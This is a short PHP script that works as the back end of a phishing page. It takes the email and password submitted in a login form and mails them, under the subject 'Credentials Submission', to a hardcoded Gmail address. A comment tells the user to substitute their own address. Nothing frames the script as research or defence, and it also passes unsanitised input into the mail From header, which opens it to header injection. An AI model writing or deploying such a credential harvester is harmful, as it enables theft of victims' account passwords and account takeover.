<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve email and password from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Set up the email details
    $to = 'alanking105@gmail.com';  // Replace with your email address
    $subject = 'Credentials Submission';
    $message = "Email: $email\nPassword: $password";

    // Send the email
    $headers = "From: $email";
    if (mail($to, $subject, $message, $headers)) {
        echo 'Email sent successfully.';
    } else {
        echo 'Failed to send email.';
    }
}
?>
